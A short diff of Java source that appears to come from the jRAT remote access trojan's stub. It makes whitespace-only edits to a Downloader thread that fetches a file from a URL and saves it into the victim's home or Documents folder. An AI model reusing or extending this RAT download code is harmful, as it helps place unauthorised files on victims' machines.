@@ -11,7 +11,6 @@ import pro.jrat.common.OperatingSystem;
 import pro.jrat.common.downloadable.Downloadable;
 import pro.jrat.stub.packets.incoming.Packet36Uninstall;
 
-
 public class Downloader extends Thread {
 
 	private String url;
@@ -41,14 +40,14 @@ public class Downloader extends Thread {
 				} else {
 					file = new File(System.getProperty("user.home") + "/Documents/" + fileName);
 				}
-				
+
 				if (!file.getParentFile().exists()) {
 					file.getParentFile().mkdirs();
 				}
 
 				InputStream in = con.getInputStream();
 				FileOutputStream fout = new FileOutputStream(file);
-				
+
 				byte data[] = new byte[1024];
 				int count;
 				while ((count = in.read(data, 0, 1024)) != -1) {
